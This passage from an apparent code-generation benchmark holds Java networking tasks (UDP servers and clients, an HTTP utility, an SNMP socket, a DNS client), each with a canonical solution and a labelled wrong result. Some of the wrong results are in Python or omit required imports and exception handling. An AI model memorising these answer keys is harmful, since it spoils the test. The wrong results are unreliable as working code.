    "Instruction": "Task Description: Implement a UDP-based communication handler class that can act as a server to receive files and process initialization messages from clients.\n\nClass Description: The UdpCommunicationHandler class provides functionality to create a UDP server that listens on a specified port for incoming messages. It handles two types of messages: initialization messages for receiver setup and file information messages. The class manages the UDP socket lifecycle and includes methods for processing received messages.\n\nAttributes:\n- mDatagramSocket: DatagramSocket - The UDP socket used for communication\n\nMethods:\n- startFileReceiverServer(int serverPort) -> void - Starts the UDP server on the specified port to receive messages. Continuously listens for incoming packets and processes them based on their content.\n  Input: serverPort - int - The port number to bind the server to\n  Output: None (throws Exception if socket operations fail)\n  \n- handleReceiverInit(InetAddress inetAddress, int port) -> void - Handles the receiver initialization logic when an initialization message is received.\n  Input: \n    inetAddress - InetAddress - The client's IP address\n    port - int - The client's port number\n  Output: None\n  \n- parseFileInfo(String msg) -> void - Parses and processes file information messages received from clients.\n  Input: msg - String - The received message containing file information\n  Output: None\n  \n- closeSocket() -> void - Properly closes and cleans up the UDP socket resources.\n  Input: None\n  Output: None",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n\n    private DatagramSocket mDatagramSocket;\n\n    public void startFileReceiverServer(int serverPort) throws Exception {\n        mDatagramSocket = new DatagramSocket(serverPort);\n        byte[] receiveData = new byte[1024];\n        \n        while(true) {\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            mDatagramSocket.receive(receivePacket);\n            String msg = new String(receivePacket.getData()).trim();\n            InetAddress inetAddress = receivePacket.getAddress();\n            int port = receivePacket.getPort();\n            \n            if(msg != null && msg.startsWith(Constant.MSG_FILE_RECEIVER_INIT)) {\n                handleReceiverInit(inetAddress, port);\n            } else {\n                parseFileInfo(msg);\n            }\n        }\n    }\n\n    private void handleReceiverInit(InetAddress inetAddress, int port) {\n        // Handle receiver initialization logic\n    }\n\n    private void parseFileInfo(String msg) {\n        // Parse file information\n    }\n\n    public void closeSocket() {\n        if(mDatagramSocket != null) {\n            mDatagramSocket.disconnect();\n            mDatagramSocket.close();\n            mDatagramSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n\n    public void startFileReceiverServer(int serverPort) throws IOException {\n        mDatagramSocket = new DatagramSocket(serverPort);\n        byte[] buffer = new byte[65535];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        while (true) {\n            mDatagramSocket.receive(packet);\n            String msg = new String(packet.getData(), 0, packet.getLength());\n            InetAddress inetAddress = packet.getAddress();\n            int port = packet.getPort();\n            if (msg.startsWith(\"INIT\")) {\n                handleReceiverInit(inetAddress, port);\n            } else if (msg.startsWith(\"FILEINFO\")) {\n                parseFileInfo(msg);\n            }\n            packet.setLength(buffer.length);\n        }\n    }\n\n    public void handleReceiverInit(InetAddress inetAddress, int port) {\n        // Handle receiver initialization logic\n    }\n\n    public void parseFileInfo(String msg) {\n        // Parse and process file information message\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null) {\n            mDatagramSocket.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 609,
    "Instruction": "Task Description: Implement a UDP client function that sends a message to a server and waits for a response.\n\nFunction Description: The function establishes a UDP connection, sends a predefined message (\"hello world\") to a specified server (localhost on port 9876), waits for a response, prints the server's reply, and then closes the connection. This demonstrates basic UDP client-server communication.\n\nInput: None (The target address and port are hardcoded as \"localhost\" and 9876 respectively)\n\nOutput: None (The function prints the server's response to the console but doesn't return any value)",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.DatagramPacket;\n\nprivate void sendWifiInfoToClient() throws Exception {\n    DatagramSocket clientSocket = new DatagramSocket();\n    InetAddress IPAddress = InetAddress.getByName(\"localhost\");\n    byte[] sendData = new byte[1024];\n    byte[] receiveData = new byte[1024];\n    String sentence = \"hello world\";\n    sendData = sentence.getBytes();\n    DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, 9876);\n    clientSocket.send(sendPacket);\n    DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n    clientSocket.receive(receivePacket);\n    String modifiedSentence = new String(receivePacket.getData());\n    System.out.println(\"FROM SERVER:\" + modifiedSentence);\n    clientSocket.close();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "wrong_result": "import socket\n\ndef udp_client():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_address = ('localhost', 9876)\n    message = b'hello world'\n    sent = sock.sendto(message, server_address)\n    data, address = sock.recvfrom(4096)\n    print(f\"Received: {data.decode()}\")\n    sock.close()"
  },
  {
    "Task_id": 61,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests (GET and POST) using HttpURLConnection, with proper error handling and response processing.\n\nClass Description: HttpUtils is a utility class that provides static methods for making HTTP requests. It handles both GET and POST requests, manages connection settings, processes responses, and includes custom error handling for HTTP errors.\n\nAttributes:\n\nError.responseCode: int - The HTTP response code when an error occurs\nError.output: String - The error response body from the server\n\nMethods:\n\npost: post(String request) -> String - Makes a POST request to the specified URL with an empty body\npost: post(String request, String body) -> String - Makes a POST request to the specified URL with the given body\nget: get(String request) -> String - Makes a GET request to the specified URL with default timeout\nget: get(String request, IOUtils.LineRead callback, int timeout) -> String - Makes a GET request to the specified URL with custom timeout and response line callback\nhandleResponse: handleResponse(HttpURLConnection connection, IOUtils.LineRead callback) -> String - Internal method to process the HTTP response\nError.toString: toString() -> String - Returns a string representation of the error including response code and output",
    "Canonical_solution": "import java.io.DataOutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpUtils {\n\n    public static String post(String request) throws Exception {\n        return post(request, \"\");\n    }\n\n    public static String post(String request, String body) throws Exception {\n        URL url = new URL(request);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            connection.setRequestProperty(\"charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Length\", \"\" + Integer.toString(body.getBytes().length));\n            connection.setUseCaches(false);\n            connection.setConnectTimeout(60000);\n            connection.setReadTimeout(60000);\n            DataOutputStream wr = new DataOutputStream(connection.getOutputStream());\n            try {\n                wr.writeBytes(body);\n                wr.flush();\n            } finally {\n                wr.close();\n            }\n            return handleResponse(connection, null);\n        } finally {\n            connection.disconnect();\n        }\n    }\n\n    public static String get(String request) throws Exception {\n        return get(request, null, 3000);\n    }\n\n    public static String get(String request, IOUtils.LineRead callback, int timeout) throws Exception {\n        URL url = new URL(request);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"GET\");\n            connection.setUseCaches(false);\n            if (timeout > 0) {\n                connection.setConnectTimeout(timeout);\n                connection.setReadTimeout(timeout);\n            }\n            return handleResponse(connection, callback);\n        } finally {\n            connection.disconnect();\n        }\n    }\n\n    private static String handleResponse(HttpURLConnection connection, IOUtils.LineRead callback) throws Exception {\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 200 && responseCode < 300) {\n            return IOUtils.readAll(connection.getInputStream(), callback);\n        } else {\n            throw new Error(responseCode, IOUtils.readAll(connection.getErrorStream(), callback));\n        }\n    }\n\n    public static class Error extends RuntimeException {\n        public final int responseCode;\n        public final String output;\n\n        public Error(int responseCode, String output) {\n            this.responseCode = responseCode;\n            this.output = output;\n        }\n\n        @Override\n        public String toString() {\n            return \"Error{\" +\n                    \"responseCode=\" + responseCode +\n                    \", output='\" + output + '\\'' +\n                    '}';\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpUtils {\n    public static class Error {\n        public final int responseCode;\n        public final String output;\n\n        public Error(int responseCode, String output) {\n            this.responseCode = responseCode;\n            this.output = output;\n        }\n\n        @Override\n        public String toString() {\n            return \"Error: \" + responseCode + \" - \" + output;\n        }\n    }\n\n    public static interface LineRead {\n        void onLine(String line);\n    }\n\n    public static String post(String request) throws Error {\n        return post(request, \"\");\n    }\n\n    public static String post(String request, String body) throws Error {\n        URL url;\n        try {\n            url = new URL(request);\n        } catch (MalformedURLException e) {\n            throw new Error(500, \"Invalid URL: \" + request);\n        }\n\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setConnectTimeout(5000);\n        connection.setReadTimeout(5000);\n        connection.setDoOutput(true);\n\n        try (OutputStream os = connection.getOutputStream()) {\n            byte[] input = body.getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        } catch (IOException e) {\n            throw new Error(500, \"Error writing request body: \" + e.getMessage());\n        }\n\n        try {\n            return handleResponse(connection, null);\n        } catch (IOException e) {\n            throw new Error(500, \"I/O error: \" + e.getMessage());\n        }\n    }\n\n    public static String get(String request) throws Error {\n        return get(request, null, 5000);\n    }\n\n    public static String get(String request, LineRead callback, int timeout) throws Error {\n        URL url;\n        try {\n            url = new URL(request);\n        } catch (MalformedURLException e) {\n            throw new Error(500, \"Invalid URL: \" + request);\n        }\n\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.setConnectTimeout(timeout);\n        connection.setReadTimeout(timeout);\n\n        try {\n            return handleResponse(connection, callback);\n        } catch (IOException e) {\n            throw new Error(500, \"I/O error: \" + e.getMessage());\n        }\n    }\n\n    public static String handleResponse(HttpURLConnection connection, LineRead callback) throws Error {\n        StringBuilder response = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line).append(\"\\n\");\n                if (callback != null) {\n                    callback.onLine(line);\n                }\n            }\n        } catch (IOException e) {\n            try (BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()))) {\n                String errorLine;\n                while ((errorLine = errorReader.readLine()) != null) {\n                    response.append(errorLine).append(\"\\n\");\n                    if (callback != null) {\n                        callback.onLine(errorLine);\n                    }\n                }\n            } catch (IOException ex) {\n                throw new Error(connection.getResponseCode(), \"Error reading error stream\");\n            }\n        }\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode != 200) {\n            throw new Error(responseCode, response.toString());\n        }\n\n        return response.toString();\n    }\n}"
  },
  {
    "Task_id": 611,
    "Instruction": "Task Description: Implement a UDP communication handler class that facilitates sending UDP messages and manages socket resources.\n\nClass Description: The UdpCommunicationHandler class provides functionality for sending UDP messages to a specified IP address and port, and includes methods for proper socket cleanup. It's designed for scenarios where a client needs to send confirmation messages to a server.\n\nAttributes:\n- mDatagramSocket: DatagramSocket - The UDP socket used for communication\n\nMethods:\n- sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) -> void - Sends a predefined success message (MSG_FILE_RECEIVER_INIT_SUCCESS) to the specified IP address and port. The socket is created on a port number that's one higher than the target port. Throws Exception if communication fails.\n- closeSocket() -> void - Closes and cleans up the DatagramSocket resource if it exists. This method should be called when the communication is complete to release system resources.\n\nInput:\n- For sendFileReceiverInitSuccessMsg: IpPortInfo object containing target IP address (InetAddress) and port number (int)\n- For closeSocket: None\n\nOutput:\n- For sendFileReceiverInitSuccessMsg: None (void), but sends UDP packet to specified destination\n- For closeSocket: None (void)",
    "Canonical_solution": "import android.util.Log;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n\n    public void sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) throws Exception {\n        Log.i(\"UdpCommunicationHandler\", \"sendFileReceiverInitSuccessMsg------>>>start\");\n        mDatagramSocket = new DatagramSocket(ipPortInfo.getPort() + 1);\n        byte[] sendData = Constant.MSG_FILE_RECEIVER_INIT_SUCCESS.getBytes(BaseTransfer.UTF_8);\n        DatagramPacket sendPacket = new DatagramPacket(\n            sendData, \n            sendData.length, \n            ipPortInfo.getInetAddress(), \n            ipPortInfo.getPort()\n        );\n        mDatagramSocket.send(sendPacket);\n        Log.i(\"UdpCommunicationHandler\", \"Send Msg To FileSender######>>>\" + Constant.MSG_FILE_RECEIVER_INIT_SUCCESS);\n        Log.i(\"UdpCommunicationHandler\", \"sendFileReceiverInitSuccessMsg------>>>end\");\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null) {\n            mDatagramSocket.disconnect();\n            mDatagramSocket.close();\n            mDatagramSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n    private static final String MSG_FILE_RECEIVER_INIT_SUCCESS = \"File receiver initialized successfully\";\n\n    public void sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) throws Exception {\n        int targetPort = ipPortInfo.getPort();\n        int localPort = targetPort + 1;\n        try {\n            mDatagramSocket = new DatagramSocket(localPort);\n            byte[] buffer = MSG_FILE_RECEIVER_INIT_SUCCESS.getBytes();\n            InetAddress targetIp = ipPortInfo.getInetAddress();\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetIp, targetPort);\n            mDatagramSocket.send(packet);\n        } catch (IOException e) {\n            throw new Exception(\"Communication failed\", e);\n        }\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null) {\n            mDatagramSocket.close();\n            mDatagramSocket = null;\n        }\n    }\n}"
  },
  {
    "Task_id": 612,
    "Instruction": "Task Description: Create a UDP server class in Java that can send messages to a specified target host and port using UDP protocol.\n\nClass Description: The UDPServer class implements a simple UDP server that can send messages to other hosts. It encapsulates the Java DatagramSocket functionality for UDP communication.\n\nAttributes:\n- socket: DatagramSocket - The UDP socket used for communication\n- port: int - The port number the server is bound to\n\nMethods:\n- UDPServer(int port) -> void - Constructor that creates a DatagramSocket bound to the specified port\n- send(String message, String targetHost, int targetPort) -> void - Sends a message to the specified target host and port using UDP\n- close() -> void - Closes the UDP socket and releases system resources",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPServer {\n\n    private DatagramSocket socket;\n    private int port;\n\n    public UDPServer(int port) throws Exception {\n        this.port = port;\n        this.socket = new DatagramSocket(port);\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws Exception {\n        DatagramPacket packet = new DatagramPacket(\n            message.getBytes(),\n            message.length(),\n            InetAddress.getByName(targetHost),\n            targetPort\n        );\n        socket.send(packet);\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class UDPServer {\n    private DatagramSocket socket;\n    private int port;\n\n    public UDPServer(int port) {\n        this.socket = new DatagramSocket(port);\n        this.port = port;\n    }\n\n    public void send(String message, String targetHost, int targetPort) {\n        byte[] buffer = message.getBytes();\n        InetAddress address = InetAddress.getByName(targetHost);\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, targetPort);\n        socket.send(packet);\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 613,
    "Instruction": "Task Description: Create a Java class that implements a UDP socket for SNMP communication, capable of sending and receiving datagram packets asynchronously while handling errors and resource cleanup properly.\n\nClass Description: The SnmpSocket class provides UDP socket functionality for SNMP communication, managing packet transmission and reception in a separate thread. It includes methods for sending packets, checking socket validity, and proper resource cleanup. The class implements Runnable to handle incoming packets asynchronously.\n\nAttributes:\n_socket: [DatagramSocket] - The UDP socket instance for communication\n_dgramHdlr: [SnmpResponseHandler] - Handler for processing received datagrams\n_sockThread: [Thread] - Thread for asynchronous packet reception\n_buffer: [byte[]] - Buffer for storing incoming packet data\nisClosing: [boolean] - Flag indicating if the socket is being closed\n_socketPort: [int] - Port number the socket is bound to\nresponseBufSize: [int] - Size of the response buffer\n\nMethods:\nConstructor: [SnmpSocket](SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) -> [void] - Initializes the UDP socket and starts the receiver thread\nsendPacket: [sendPacket](byte[] buff, int length, InetAddress addr, int port) -> [void] - Sends a datagram packet with specified data to given address and port\nsendPacket: [sendPacket](DatagramPacket dgrmpkt) -> [void] - Sends a prepared datagram packet\nisValid: [isValid]() -> [boolean] - Checks if the socket is in a valid state\nclose: [close]() -> [void] - Closes the socket and cleans up resources\nrun: [run]() -> [void] - Main thread method for receiving packets (implements Runnable)\nfinalize: [finalize]() -> [void] - Ensures proper cleanup when object is garbage collected\nhandleJavaError: [handleJavaError](Throwable thr) -> [void] - Handles Java errors during operation\nhandleDatagram: [handleDatagram](DatagramPacket dgrmpkt) -> [void] - Processes received datagrams using the response handler",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.SocketException;\nimport java.io.IOException;\nimport java.util.logging.Level;\n\nfinal class SnmpSocket implements java.lang.Runnable {\n\n    private DatagramSocket _socket = null;\n    private SnmpResponseHandler _dgramHdlr = null;\n    private Thread _sockThread = null;\n    private byte[] _buffer = null;\n    private transient boolean isClosing = false;\n\n    int _socketPort = 0;\n    int responseBufSize = 1024;\n\n    public SnmpSocket(SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) throws SocketException {\n        _socket = new DatagramSocket(0, addr);\n        _socketPort = _socket.getLocalPort();\n        responseBufSize = bufferSize;\n        _buffer = new byte[responseBufSize];\n        _dgramHdlr = rspHdlr;\n        _sockThread = new Thread(this, \"SnmpSocket\");\n        _sockThread.start();\n    }\n\n    public synchronized void sendPacket(byte[] buff, int length, InetAddress addr, int port) throws IOException {\n        DatagramPacket dgrmpkt = new DatagramPacket(buff, length, addr, port);\n        sendPacket(dgrmpkt);\n    }\n\n    public synchronized void sendPacket(DatagramPacket dgrmpkt) throws IOException {\n        if (isValid()) {\n            _socket.send(dgrmpkt);\n        } else {\n            throw new IOException(\"Invalid state of SNMP datagram socket.\");\n        }\n    }\n\n    public synchronized boolean isValid() {\n        return _socket != null && _sockThread != null && _sockThread.isAlive();\n    }\n\n    public synchronized void close() {\n        isClosing = true;\n        if (_socket != null) {\n            _socket.close();\n            _socket = null;\n        }\n        if (_sockThread != null && _sockThread.isAlive()) {\n            _sockThread.interrupt();\n            try {\n                _sockThread.join();\n            } catch (InterruptedException e) {\n            }\n            _sockThread = null;\n        }\n    }\n\n    @Override\n    public void run() {\n        Thread.currentThread().setPriority(8);\n        while (true) {\n            try {\n                DatagramPacket dgrmpkt = new DatagramPacket(_buffer, _buffer.length);\n                _socket.receive(dgrmpkt);\n                if (isClosing)\n                    break;\n                if (dgrmpkt.getLength() <= 0)\n                    continue;\n                handleDatagram(dgrmpkt);\n                if (isClosing)\n                    break;\n            } catch (IOException io) {\n                if (isClosing) {\n                    break;\n                }\n            } catch (Exception e) {\n                if (isClosing) {\n                    break;\n                }\n            } catch (ThreadDeath d) {\n                close();\n                throw d;\n            } catch (Error err) {\n                handleJavaError(err);\n            }\n        }\n    }\n\n    @Override\n    protected synchronized void finalize() {\n        close();\n    }\n\n    private synchronized void handleJavaError(Throwable thr) {\n        if (thr instanceof OutOfMemoryError) {\n            Thread.yield();\n            return;\n        }\n        if (_socket != null) {\n            _socket.close();\n            _socket = null;\n        }\n        Thread.yield();\n    }\n\n    private synchronized void handleDatagram(DatagramPacket dgrmpkt) {\n        _dgramHdlr.processDatagram(dgrmpkt);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class SnmpSocket implements Runnable {\n    private DatagramSocket _socket;\n    private SnmpResponseHandler _dgramHdlr;\n    private Thread _sockThread;\n    private byte[] _buffer;\n    private boolean isClosing;\n    private int _socketPort;\n    private int responseBufSize;\n\n    public SnmpSocket(SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) {\n        _dgramHdlr = rspHdlr;\n        _buffer = new byte[bufferSize];\n        responseBufSize = bufferSize;\n        try {\n            _socket = new DatagramSocket(0, addr);\n            _socket.setReceiveBufferSize(bufferSize);\n            _socketPort = _socket.getLocalPort();\n        } catch (IOException e) {\n            handleJavaError(e);\n        }\n        _sockThread = new Thread(this);\n        _sockThread.start();\n    }\n\n    public void sendPacket(byte[] buff, int length, InetAddress addr, int port) {\n        if (!isValid()) {\n            throw new IllegalStateException(\"Socket is not valid\");\n        }\n        DatagramPacket packet = new DatagramPacket(buff, length, addr, port);\n        sendPacket(packet);\n    }\n\n    public void sendPacket(DatagramPacket dgrmpkt) {\n        if (!isValid()) {\n            throw new IllegalStateException(\"Socket is not valid\");\n        }\n        try {\n            _socket.send(dgrmpkt);\n        } catch (IOException e) {\n            handleJavaError(e);\n        }\n    }\n\n    public boolean isValid() {\n        return _socket != null && !isClosing;\n    }\n\n    public void close() {\n        isClosing = true;\n        if (_sockThread != null) {\n            _sockThread.interrupt();\n        }\n        if (_socket != null) {\n            try {\n                _socket.close();\n            } catch (IOException e) {\n                handleJavaError(e);\n            }\n        }\n    }\n\n    @Override\n    public void run() {\n        while (!isClosing) {\n            try {\n                DatagramPacket packet = new DatagramPacket(_buffer, _buffer.length);\n                _socket.receive(packet);\n                handleDatagram(packet);\n            } catch (IOException e) {\n                handleJavaError(e);\n            }\n        }\n    }\n\n    protected void finalize() {\n        close();\n    }\n\n    private void handleJavaError(Throwable thr) {\n        thr.printStackTrace();\n    }\n\n    private void handleDatagram(DatagramPacket dgrmpkt) {\n        _dgramHdlr.handle(dgrmpkt);\n    }\n}"
  },
  {
    "Task_id": 614,
    "Instruction": "Task Description: Implement a UDP server function that continuously listens for incoming packets, processes the received data by converting it to uppercase, and sends the modified data back to the client.\n\nFunction Description: The function sets up a UDP server that binds to a specific port (9876) and enters an infinite loop to receive incoming packets. Upon receiving a packet, it extracts the data, converts it to uppercase, and sends the modified data back to the client's address and port. The function handles all necessary UDP communication steps including socket creation, packet reception, data processing, and response transmission.\n\nInput: None (The function takes no parameters as it binds to a fixed port and processes incoming UDP packets)\n\nOutput: None (The function does not return any value but prints received messages to the console and sends responses back to clients)",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetAddress;\n\nprivate void receiveServerUdpInfo() throws Exception {\n    DatagramSocket serverSocket = new DatagramSocket(9876);\n    byte[] receiveData = new byte[1024];\n    byte[] sendData = new byte[1024];\n    while(true) {\n        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n        serverSocket.receive(receivePacket);\n        String sentence = new String(receivePacket.getData());\n        System.out.println(\"RECEIVED: \" + sentence);\n        InetAddress IPAddress = receivePacket.getAddress();\n        int port = receivePacket.getPort();\n        String capitalizedSentence = sentence.toUpperCase();\n        sendData = capitalizedSentence.getBytes();\n        DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, port);\n        serverSocket.send(sendPacket);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 2,
    "wrong_result": "import socket\n\ndef udp_server():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind(('localhost', 9876))\n    while True:\n        data, addr = sock.recvfrom(65535)\n        message = data.decode('utf-8')\n        print(f\"Received: {message}\")\n        response = message.upper().encode('utf-8')\n        sock.sendto(response, addr)"
  },
  {
    "Task_id": 615,
    "Instruction": "Task Description: Implement a DNS UDP client class that can resolve DNS queries (A records and TXT records) by communicating with DNS servers over UDP.\n\nClass Description: The DnsUdpClient class provides functionality to send DNS queries to specified DNS servers and process the responses. It supports resolving domain names to IPv4 addresses (A records) and retrieving text records (TXT records).\n\nAttributes:\nDNS_SERVERS: InetSocketAddress[] - An array of predefined DNS server addresses with their respective ports\n\nMethods:\nresolveAOverUdp: resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) -> List<Inet4Address> - Resolves a DNS A record query by sending it to the specified DNS server and returns a list of IPv4 addresses. Throws Exception if the operation fails.\n\ntoIps: toIps(byte[] buffer) -> List<Inet4Address> - Helper method that converts DNS response data into a list of IPv4 addresses by parsing A records.\n\nresolveTXTOverUdp: resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) -> String - Resolves a DNS TXT record query by sending it to the specified DNS server and returns the text content. Throws Exception if the operation fails.\n\ntoTXT: toTXT(byte[] buffer) -> String - Helper method that extracts TXT record data from DNS response and returns it as a string. Throws RuntimeException if no TXT record is found.",
    "Canonical_solution": "import net.sf.ivmaidns.dns.DNSConnection;\nimport net.sf.ivmaidns.dns.DNSMsgHeader;\nimport net.sf.ivmaidns.dns.DNSName;\nimport net.sf.ivmaidns.dns.DNSRecord;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DnsUdpClient {\n    private final static InetSocketAddress[] DNS_SERVERS = new InetSocketAddress[]{\n            new InetSocketAddress(\"8.8.8.8\", 53),\n            new InetSocketAddress(\"208.67.222.222\", 443),\n            new InetSocketAddress(\"208.67.220.220\", 443),\n            new InetSocketAddress(\"199.91.73.222\", 3389),\n            new InetSocketAddress(\"87.118.100.175\", 110),\n            new InetSocketAddress(\"87.118.85.241\", 110),\n            new InetSocketAddress(\"77.109.139.29\", 110),\n            new InetSocketAddress(\"77.109.138.45\", 110)\n    };\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(1000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toIps(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private List<Inet4Address> toIps(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        List<Inet4Address> ips = new ArrayList<Inet4Address>();\n        for (DNSRecord record : records) {\n            if (DNSRecord.A == record.getRType()) {\n                if (record.getRData().length > 0) {\n                    ips.add((Inet4Address) record.getRData()[0]);\n                }\n            }\n        }\n        return ips;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(2000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toTXT(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private String toTXT(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        for (DNSRecord record : records) {\n            if (DNSRecord.TXT == record.getRType() && record.getRData().length > 0) {\n                return (String) record.getRData()[0];\n            }\n        }\n        throw new RuntimeException(\"not found\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "wrong_result": "public class DnsUdpClient {\n    public static final InetSocketAddress[] DNS_SERVERS = new InetSocketAddress[] {\n        new InetSocketAddress(\"8.8.8.8\", 53),\n        new InetSocketAddress(\"1.1.1.1\", 53)\n    };\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(query, query.length, dnsServer);\n        socket.send(packet);\n        byte[] response = new byte[512];\n        DatagramPacket responsePacket = new DatagramPacket(response, response.length);\n        socket.receive(responsePacket);\n        return toIps(responsePacket.getData());\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(query, query.length, dnsServer);\n        socket.send(packet);\n        byte[] response = new byte[512];\n        DatagramPacket responsePacket = new DatagramPacket(response, response.length);\n        socket.receive(responsePacket);\n        return toTXT(responsePacket.getData());\n    }\n\n    private List<Inet4Address> toIps(byte[] buffer) {\n        int offset = 0;\n        int id = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n        int flags = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n        int qdcount = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n        int ancount = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n        int nscount = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n        int arcount = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n\n        for (int i = 0; i < qdcount; i++) {\n            int nameLength = 0;\n            while (buffer[offset + nameLength] != 0) {\n                nameLength += buffer[offset + nameLength] + 1;\n            }\n            offset += nameLength;\n            offset += 4; // type and class\n        }\n\n        List<Inet4Address> ips = new ArrayList<>();\n        for (int i = 0; i < ancount; i++) {\n            int nameLength = 0;\n            while (buffer[offset + nameLength] != 0) {\n                nameLength += buffer[offset + nameLength] + 1;\n            }\n            offset += nameLength;\n            int type = (buffer[offset] << 8) | buffer[offset + 1];\n            offset += 2;\n            int clazz = (buffer[offset] << 8) | buffer[offset + 1];\n            offset += 2;\n            int ttl = (buffer[offset] << 24) | (buffer[offset + 1] << 16) |\n                      (buffer[offset + 2] << 8) | buffer[offset + 3];\n            offset += 4;\n            int dataLength = 